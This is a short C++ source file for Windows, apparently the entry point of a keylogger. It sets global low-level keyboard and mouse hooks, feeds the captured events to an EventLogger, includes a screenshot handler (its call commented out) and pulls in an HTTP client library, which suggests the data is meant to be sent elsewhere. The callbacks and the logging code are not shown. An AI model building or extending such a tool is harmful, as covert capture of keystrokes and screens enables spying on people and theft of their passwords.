#include <iostream>
#include <Windows.h>
#include <cpr/cpr.h>

#include "EventLogger.h"
#include "MouseHandler.h"
#include "KeyboardHandler.h"
#include "ScreenshotHandler.h"

int main() {
    EventLogger::getInstance().start();

    //TakeScreenshot(nullptr);

    const HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(&KeyboardCallback), nullptr, 0);
    const HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&MouseCallback), nullptr, 0);

    MSG message;
    while (GetMessage(&message, nullptr, 0, 0) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboard);
    UnhookWindowsHookEx(mouse);

    EventLogger::getInstance().stop();

    return 0;
}
